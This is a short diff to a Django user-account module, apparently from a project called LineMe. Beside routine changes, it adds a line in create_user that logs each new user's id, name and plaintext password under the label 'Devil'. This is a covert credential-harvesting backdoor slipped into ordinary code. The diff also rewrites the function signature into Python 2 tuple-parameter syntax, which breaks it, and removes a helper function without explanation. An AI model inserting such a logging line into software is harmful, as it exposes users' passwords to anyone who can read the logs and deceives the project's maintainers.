@@ -18,7 +18,7 @@ from Human.models import Privacy, Extra, GroupMember, Link
 from LineMe.settings import logger, DEBUG
 
 
-def create_user(request, name, email, password, password2):
+def create_user(request, (name, email, password, password2)):
 
     name = name.lower()
 
@@ -58,6 +58,7 @@ def create_user(request, name, email, password, password2):
             return -4
 
         logger.info(logger_join('Create', get_session_id(request)))
+        logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), name, password]) + ']'))
         return 0
 
 
@@ -70,12 +71,6 @@ def get_user_name(user):
         return user.username
     else:
         return first + ' ' + last
-
-
-def get_user_groups(user):
-    gms = GroupMember.objects.filter(user=user, is_joined=True)
-    groups = [gm.group for gm in gms]
-    return groups
 
 
 def get_user_msgs(user):
